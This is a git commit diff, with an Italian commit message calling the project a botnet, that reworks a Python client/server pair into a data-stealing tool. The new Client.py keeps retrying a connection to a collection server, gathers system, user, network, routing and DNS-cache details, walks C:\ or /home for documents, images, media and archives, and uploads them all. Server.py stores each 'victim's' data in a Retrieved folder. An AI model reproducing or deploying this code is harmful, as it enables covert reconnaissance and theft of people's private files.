baa3c4c5147e32f1e6fd65192a6c0a6f46ecf888
Vincenzo Donadio <71927688+DonnyD-01@users.noreply.github.com>
2022-12-09 22:41:44 +0100

    Ho swappato Client e Server perchè m'agg rutt o cazz
    Trasformato la ricerca delle informazioni da offline ad online per ottenere sempre le informazioni più aggiornate possibile
    Questo commit serve per testare la botnet in remoto

--- Client.py
+++ Client.py
@@ -1,94 +1,162 @@
-import json,socket,os,nmap
-from datetime import datetime
+import platform, re, uuid, socket, psutil, json, cpuinfo, datetime, subprocess, os
 
 #Setting variables for connection
-#serverName = 'localhost'
+serverName = 'localhost'
 serverPort = 17703
-bufferSize = 65536
-
-#Finds devices connected to the Network
-target = '127.0.0.0/24'
-
-scanner = nmap.PortScanner()
-scanner.scan(target, arguments = '-sn' , sudo = False)
-
-hosts = []
-for host in scanner.all_hosts():
-	addresses = scanner[host]['addresses']
-	hosts.append(addresses)
 
 #Connection to the server
 clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-for host in hosts:
-	print("Trying to connect at : " + host['ipv4'])
+#Waiting for the Server to be online
+while True:
 	try:
-		clientSocket.connect((host['ipv4'], serverPort))
-		break	
+		clientSocket.connect((serverName,serverPort))
+		break
 	except socket.error as e:
-		print("Failed")
+		continue
+
+#Getting information about the system
+systemInfo = {}
+systemInfo['platformInfo'] = {}
+try:	
+	systemInfo['platformInfo']['boot-time'] = datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
+	systemInfo['platformInfo']['platform'] = platform.system()
+	systemInfo['platformInfo']['platform-release'] = platform.release()
+	systemInfo['platformInfo']['platform-version'] = platform.version()
+	systemInfo['platformInfo']['architecture'] = platform.machine()
+	users = psutil.users() 
+	i=1
+	for user in users:
+		systemInfo['platformInfo']['user' +str(i) + "-name"] = user.name 
+		i += 1
+except: 
+	systemInfo['platformInfo']['error'] = "Cannot Recover additional System Information"
+
+#Getting information about the CPU
+systemInfo['cpuInfo'] = {}
+try:
+	systemInfo['cpuInfo']['cpu'] = cpuinfo.get_cpu_info()['brand_raw']
+	systemInfo['cpuInfo']['cores'] = psutil.cpu_count(logical = False)
+	systemInfo['cpuInfo']['threads'] = psutil.cpu_count()
+	systemInfo['cpuInfo']['total-usage'] = str(psutil.cpu_percent()) + "%"
+	cpuFreq = psutil.cpu_freq()
+	systemInfo['cpuInfo']['max-frequency'] = str(round(cpuFreq.max, 2)) + "MHz"
+	systemInfo['cpuInfo']['current-frequency'] = str(round(cpuFreq.current, 2)) + "MHz" 
+	systemInfo['cpuInfo']['min-frequency'] = str(round(cpuFreq.min, 2)) + "MHz"
+except:
+	systemInfo['cpuInfo']['error'] = "Cannot Recover additional CPU Information"
+
+#Getting information about the Memory
+systemInfo['memoryInfo'] = {}
+try:
+	ram=psutil.virtual_memory()
+	systemInfo['memoryInfo']['ram-size'] = str(round(ram.total / (1024.0 ** 3), 2)) + "GB"
+	systemInfo['memoryInfo']['available'] = str(round(ram.available / (1024.0 ** 3), 2)) + "GB"
+	systemInfo['memoryInfo']['used'] = str(round(ram.used / (1024.0 ** 3), 2)) + "GB"
+	systemInfo['memoryInfo']['percentage-used'] = str(ram.percent) + "%"
+	systemInfo['memoryInfo']['swap-memory'] = str(round(psutil.swap_memory().total / (1024.0 ** 3), 2)) + "GB"
+except:
+	systemInfo['memoryInfo']['error'] = "Cannot Recover additional Memory Information"
+
+#Getting information about the disks
+systemInfo['diskInfo'] = {}
+try:
+	partitions = psutil.disk_partitions(all = False)
+	i = 1
+	for partition in partitions:
+		partitionUsage = psutil.disk_usage(partition.mountpoint)
+		if partitionUsage.free != 0:
+			systemInfo['diskInfo']['disk' + str(i) + '-name'] =  partition.device
+			systemInfo['diskInfo']['disk' + str(i) + '-mountpoint'] = partition.mountpoint
+			systemInfo['diskInfo']['disk' + str(i) + '-filesystem'] = partition.fstype
+			systemInfo['diskInfo']['disk' + str(i) + '-totalsize'] = str(round(partitionUsage.total / (1024.0 ** 3), 2)) + "GB"
+			systemInfo['diskInfo']['disk' + str(i) + '-free'] = str(round(partitionUsage.free / (1024.0 ** 3), 2)) + "GB"
+			i += 1
+		else:
+			continue
+except:
+	systemInfo['diskInfo']['error'] = "Cannot recover additional Disks Information"
+
+#Getting information about the network card
+systemInfo['networkInfo'] = {}
+try:
+	systemInfo['networkInfo']['hostname'] = socket.gethostname()
+	systemInfo['networkInfo']['ip-address'] = socket.gethostbyname(socket.gethostname())
+	systemInfo['networkInfo']['mac-address'] = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
+	net_io = psutil.net_io_counters()
+	systemInfo['networkInfo']['bytes-sent'] = str(round(net_io.bytes_sent / (1024 ** 2), 2)) + "MB"
+	systemInfo['networkInfo']['bytes-received'] = str(round(net_io.bytes_recv / (1024 ** 2), 2)) + "MB"
+except:
+	systemInfo['networkInfo']['error'] = "Cannot recover additional Network Information"
+
+#Getting information about the battery
+systemInfo['batteryInfo'] = {}
+try:
+	battery = psutil.sensors_battery()
+	systemInfo['batteryInfo']['battery'] = "false"
+	if battery != None:
+		systemInfo['batteryInfo']['battery'] = "true"
+		systemInfo['batteryInfo']['charge'] = str(battery.percent) + "%"
+		systemInfo['batteryInfo']['plugged'] = str(battery.power_plugged)
+except:
+	systemInfo['batteryInfo']['error'] = "Cannot recover additional Battery Infomation"
 	
-#Reception and decoding of the messages sent by the server
-info = clientSocket.recv(bufferSize).decode()
-clientSocket.send("TMB".encode())
-infoJson = json.loads(info)
-
-routingTable = clientSocket.recv(bufferSize).decode()
-clientSocket.send("TMB".encode())
-dns = clientSocket.recv(bufferSize).decode()
-clientSocket.send("TMB".encode())
-
-
-#Building the path of the direcotry to create based on OS and timestamp
-if(infoJson['platformInfo']['platform'] == "Windows"):
-    path = "Retrieved/" + infoJson['platformInfo']['platform'] + " " + infoJson['platformInfo']['platform-version'] + " " + datetime.now().strftime("%d-%m-%Y %H-%M-%S")
+#Getting info about RoutingTable and DNS 
+if systemInfo['platformInfo']['platform'] == 'Windows':
+	rtCommand = subprocess.run(['route', 'print'], stdout = subprocess.PIPE)
+	dnsCommand = subprocess.run(['ipconfig', '/displaydns'], stdout = subprocess.PIPE) 
 else:
-    path = "Retrieved/" + infoJson['platformInfo']['platform'] + " " + infoJson['platformInfo']['platform-release'] + " " + datetime.now().strftime("%d-%m-%Y %H-%M-%S")
+	rtCommand = subprocess.run(['netstat', '-rn'], stdout = subprocess.PIPE)
+	dnsCommand = subprocess.run(['systemctl', 'is-active', 'system-resolved'], stdout = subprocess.PIPE)
+	
+#Saving the output into strings for the send 	
+routingTable = rtCommand.stdout
+dns = dnsCommand.stdout
 
-#Creation of server's subdirectory if doesn't exist
-if not os.path.isdir(path):
-    try:
-        os.makedirs(path)
-        with open(path + "/SystemInformation.JSON", "w") as file:
-            file.write(info)
-            
-        with open(path + "/RoutingTable.txt", "w") as file:
-            file.write(routingTable)
-            
-        with open(path + "/DNS.txt", "w") as file:
-            file.write(dns)
- 
-    except OSError:
-        print ("Creation of the subdirectory \"{path}\" failed")
-        
-#Print of all the system information of the server
-print(info)
-print(routingTable)
-print(dns)
+#Searching files 
+if systemInfo['platformInfo']['platform'] == 'Windows':
+	path = "C:\\"
+	separator = "\\"
+else:
+	path = r"/home"
+	separator = r'/'
+filesToSend = [{}]
+for root, dirs, files in os.walk(path):
+	for x in files:
+		if (x.endswith(('.txt','.doc','.docx','.mp4','.pdf','.mp3','.rtf','.jpg','.jpeg','.gif','.mkv','.zip','.rar','.7z','.tar','.ppt','.pptx','.xsl','.xlsx','.ods','.odt'))):
+			filesProperties = {}
+			filesProperties['path'] = root + separator + x
+			filesProperties['filename'] = x
+			filesToSend.append(filesProperties)
+filesToSend.pop(0)			
+numFiles = len(filesToSend)
 
-#Obtaining number of files to receive 
-numFiles = int(clientSocket.recv(bufferSize).decode())
-clientSocket.send("TMB".encode())
-
-#Obtaining files from the Server
-for i in range(numFiles):
-	fileName = clientSocket.recv(bufferSize).decode()
-	clientSocket.send("TMB".encode())
-	fileSize = clientSocket.recv(bufferSize).decode()
-	clientSocket.send("TMB".encode())
-
-	print("Received new File: " + fileName + "\t" + fileSize + "B")  
-
-	done = False
-
-	with open (path + "/" + fileName, "wb") as f:
-		fileBytes = b""
-		while not done:
-			if fileBytes[-5:] == b"<TMB>":
-				done = True
-			else:
-				data = clientSocket.recv(bufferSize)
-				fileBytes += data
-		f.write(fileBytes[:-5])
-		clientSocket.send("TMB".encode())
-clientSocket.close()
+#Sending obtained information
+try:	
+	clientSocket.send(json.dumps(systemInfo, indent = 4).encode())
+	clientSocket.recv(128)
+	clientSocket.send(routingTable)
+	clientSocket.recv(128)
+	clientSocket.send(dns)
+	clientSocket.recv(128)
+except:
+	print("Error when sending information")
+	
+#Sending obtained files 
+try:
+	clientSocket.send(str(numFiles).encode())
+	clientSocket.recv(128)
+	for i in range(numFiles):
+		with open (filesToSend[i]['path'],"rb") as f:
+			fileSize = os.path.getsize(filesToSend[i]['path'])
+			clientSocket.send(filesToSend[i]['filename'].encode())
+			clientSocket.recv(128)
+			clientSocket.send(str(fileSize).encode())
+			clientSocket.recv(128)
+			data = f.read()
+			clientSocket.sendall(data)
+			clientSocket.send(b"<TMB>") 
+			clientSocket.recv(128)
+	clientSocket.close()
+except: 
+	print("Error when sending files") 
--- Server.py
+++ Server.py
@@ -1,155 +1,77 @@
-import platform, re, uuid, socket, psutil, json, cpuinfo, datetime, subprocess, os
-
-#Getting information about the system
-systemInfo = {}
-systemInfo['platformInfo'] = {}
-try:	
-	systemInfo['platformInfo']['boot-time'] = datetime.datetime.fromtimestamp(psutil.boot_time()).strftime("%Y-%m-%d %H:%M:%S")
-	systemInfo['platformInfo']['platform'] = platform.system()
-	systemInfo['platformInfo']['platform-release'] = platform.release()
-	systemInfo['platformInfo']['platform-version'] = platform.version()
-	systemInfo['platformInfo']['architecture'] = platform.machine()
-	users = psutil.users() 
-	i=1
-	for user in users:
-		systemInfo['platformInfo']['user' +str(i) + "-name"] = user.name 
-		i += 1
-except: 
-	systemInfo['platformInfo']['error'] = "Cannot Recover additional System Information"
-
-#Getting information about the CPU
-systemInfo['cpuInfo'] = {}
-try:
-	systemInfo['cpuInfo']['cpu'] = cpuinfo.get_cpu_info()['brand_raw']
-	systemInfo['cpuInfo']['cores'] = psutil.cpu_count(logical = False)
-	systemInfo['cpuInfo']['threads'] = psutil.cpu_count()
-	systemInfo['cpuInfo']['total-usage'] = str(psutil.cpu_percent()) + "%"
-	cpuFreq = psutil.cpu_freq()
-	systemInfo['cpuInfo']['max-frequency'] = str(round(cpuFreq.max, 2)) + "MHz"
-	systemInfo['cpuInfo']['current-frequency'] = str(round(cpuFreq.current, 2)) + "MHz" 
-	systemInfo['cpuInfo']['min-frequency'] = str(round(cpuFreq.min, 2)) + "MHz"
-except:
-	systemInfo['cpuInfo']['error'] = "Cannot Recover additional CPU Information"
-
-#Getting information about the Memory
-systemInfo['memoryInfo'] = {}
-try:
-	ram=psutil.virtual_memory()
-	systemInfo['memoryInfo']['ram-size'] = str(round(ram.total / (1024.0 ** 3), 2)) + "GB"
-	systemInfo['memoryInfo']['available'] = str(round(ram.available / (1024.0 ** 3), 2)) + "GB"
-	systemInfo['memoryInfo']['used'] = str(round(ram.used / (1024.0 ** 3), 2)) + "GB"
-	systemInfo['memoryInfo']['percentage-used'] = str(ram.percent) + "%"
-	systemInfo['memoryInfo']['swap-memory'] = str(round(psutil.swap_memory().total / (1024.0 ** 3), 2)) + "GB"
-except:
-	systemInfo['memoryInfo']['error'] = "Cannot Recover additional Memory Information"
-
-#Getting information about the disks
-systemInfo['diskInfo'] = {}
-try:
-	partitions = psutil.disk_partitions(all = False)
-	i = 1
-	for partition in partitions:
-		partitionUsage = psutil.disk_usage(partition.mountpoint)
-		if partitionUsage.free != 0:
-			systemInfo['diskInfo']['disk' + str(i) + '-name'] =  partition.device
-			systemInfo['diskInfo']['disk' + str(i) + '-mountpoint'] = partition.mountpoint
-			systemInfo['diskInfo']['disk' + str(i) + '-filesystem'] = partition.fstype
-			systemInfo['diskInfo']['disk' + str(i) + '-totalsize'] = str(round(partitionUsage.total / (1024.0 ** 3), 2)) + "GB"
-			systemInfo['diskInfo']['disk' + str(i) + '-free'] = str(round(partitionUsage.free / (1024.0 ** 3), 2)) + "GB"
-			i += 1
-		else:
-			continue
-except:
-	systemInfo['diskInfo']['error'] = "Cannot recover additional Disks Information"
-
-#Getting information about the network card
-systemInfo['networkInfo'] = {}
-try:
-	systemInfo['networkInfo']['hostname'] = socket.gethostname()
-	systemInfo['networkInfo']['ip-address'] = socket.gethostbyname(socket.gethostname())
-	systemInfo['networkInfo']['mac-address'] = ':'.join(re.findall('..', '%012x' % uuid.getnode()))
-	net_io = psutil.net_io_counters()
-	systemInfo['networkInfo']['bytes-sent'] = str(round(net_io.bytes_sent / (1024 ** 2), 2)) + "MB"
-	systemInfo['networkInfo']['bytes-received'] = str(round(net_io.bytes_recv / (1024 ** 2), 2)) + "MB"
-except:
-	systemInfo['networkInfo']['error'] = "Cannot recover additional Network Information"
-
-#Getting information about the battery
-systemInfo['batteryInfo'] = {}
-try:
-	battery = psutil.sensors_battery()
-	systemInfo['batteryInfo']['battery'] = "false"
-	if battery != None:
-		systemInfo['batteryInfo']['battery'] = "true"
-		systemInfo['batteryInfo']['charge'] = str(battery.percent) + "%"
-		systemInfo['batteryInfo']['plugged'] = str(battery.power_plugged)
-except:
-	systemInfo['batteryInfo']['error'] = "Cannot recover additional Battery Infomation"
-	
-#Getting info about RoutingTable and DNS 
-if systemInfo['platformInfo']['platform'] == 'Windows':
-	rtCommand = subprocess.run(['route', 'print'], stdout = subprocess.PIPE)
-	dnsCommand = subprocess.run(['ipconfig', '/displaydns'], stdout = subprocess.PIPE) 
-else:
-	rtCommand = subprocess.run(['netstat', '-rn'], stdout = subprocess.PIPE)
-	dnsCommand = subprocess.run(['systemctl', 'is-active', 'system-resolved'], stdout = subprocess.PIPE)
-	
-#Saving the output into strings for the send 	
-routingTable = rtCommand.stdout
-dns = dnsCommand.stdout
-
-#Searching files 
-if systemInfo['platformInfo']['platform'] == 'Windows':
-	path = "C:\\"
-	separator = "\\"
-else:
-	path = r"/home"
-	separator = r'/'
-filesToSend = [{}]
-for root, dirs, files in os.walk(path):
-	for x in files:
-		if (x.endswith(('.txt','.doc','.docx','.mp4','.pdf','.mp3','.rtf','.jpg','.jpeg','.gif','.mkv','.zip','.rar','.7z','.tar','.ppt','.pptx','.xsl','.xlsx','.ods','.odt'))):
-			filesProperties = {}
-			filesProperties['path'] = root + separator + x
-			filesProperties['filename'] = x
-			filesToSend.append(filesProperties)
-filesToSend.pop(0)			
-numFiles = len(filesToSend)
+import json,socket,os
+from datetime import datetime
 
 #Network variables initialization for connection to the client 
+bufferSize = 65536
 serverPort = 17703
 serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 serverSocket.bind(('', serverPort))
 serverSocket.listen(1)
 
-#Sending information obtained
 while True:
-	try:
-		connectionSocket,addr = serverSocket.accept()
-		connectionSocket.send(json.dumps(systemInfo, indent = 4).encode())
-		connectionSocket.recv(128)
-		connectionSocket.send(routingTable)
-		connectionSocket.recv(128)
-		connectionSocket.send(dns)
-		connectionSocket.recv(128)
-	except:
-		print("Error when sending information")
+	connectionSocket,addr = serverSocket.accept()
 	
-#Sending obtained files 
-	try:
-		connectionSocket.send(str(numFiles).encode())
-		connectionSocket.recv(128)
-		for i in range(numFiles):
-			with open (filesToSend[i]['path'],"rb") as f:
-				fileSize = os.path.getsize(filesToSend[i]['path'])
-				connectionSocket.send(filesToSend[i]['filename'].encode())
-				connectionSocket.recv(128)
-				connectionSocket.send(str(fileSize).encode())
-				connectionSocket.recv(128)
-				data = f.read()
-				connectionSocket.sendall(data)
-				connectionSocket.send(b"<TMB>") 
-				connectionSocket.recv(128)
-		connectionSocket.close()
-	except: 
-		print("Error when sending files") 
+	#Reception and decoding of the messages sent by client
+	info = connectionSocket.recv(bufferSize).decode()
+	connectionSocket.send("TMB".encode())
+	infoJson = json.loads(info)
+
+	routingTable = connectionSocket.recv(bufferSize).decode()
+	connectionSocket.send("TMB".encode())
+	dns = connectionSocket.recv(bufferSize).decode()
+	connectionSocket.send("TMB".encode())
+
+
+	#Building the path of the direcotry to create based on OS and timestamp
+	if(infoJson['platformInfo']['platform'] == "Windows"):
+	    path = "Retrieved/" + infoJson['platformInfo']['platform'] + " " + infoJson['platformInfo']['platform-version'] + " " + datetime.now().strftime("%d-%m-%Y %H-%M-%S")
+	else:
+	    path = "Retrieved/" + infoJson['platformInfo']['platform'] + " " + infoJson['platformInfo']['platform-release'] + " " + datetime.now().strftime("%d-%m-%Y %H-%M-%S")
+
+	#Creation of server's subdirectory if doesn't exist
+	if not os.path.isdir(path):
+		try:
+			os.makedirs(path)
+			with open(path + "/SystemInformation.JSON", "w") as file:
+				file.write(info)
+		    
+			with open(path + "/RoutingTable.txt", "w") as file:
+				file.write(routingTable)
+		    
+			with open(path + "/DNS.txt", "w") as file:
+				file.write(dns)
+	 
+		except OSError:
+			print ("Creation of the subdirectory \"{path}\" failed")
+		
+	#Print of all the system information of the victim
+	print(info)
+	print(routingTable)
+	print(dns)
+
+	#Obtaining number of files to receive 
+	numFiles = int(connectionSocket.recv(bufferSize).decode())
+	connectionSocket.send("TMB".encode())
+
+	#Obtaining files from the Client
+	for i in range(numFiles):
+		fileName = connectionSocket.recv(bufferSize).decode()
+		connectionSocket.send("TMB".encode())
+		fileSize = connectionSocket.recv(bufferSize).decode()
+		connectionSocket.send("TMB".encode())
+
+		print("Received new File: " + fileName + "\t" + fileSize + "B")  
+
+		done = False
+
+		with open (path + "/" + fileName, "wb") as f:
+			fileBytes = b""
+			while not done:
+				if fileBytes[-5:] == b"<TMB>":
+					done = True
+				else:
+					data = connectionSocket.recv(bufferSize)
+					fileBytes += data
+			f.write(fileBytes[:-5])
+			connectionSocket.send("TMB".encode())
+	connectionSocket.close()
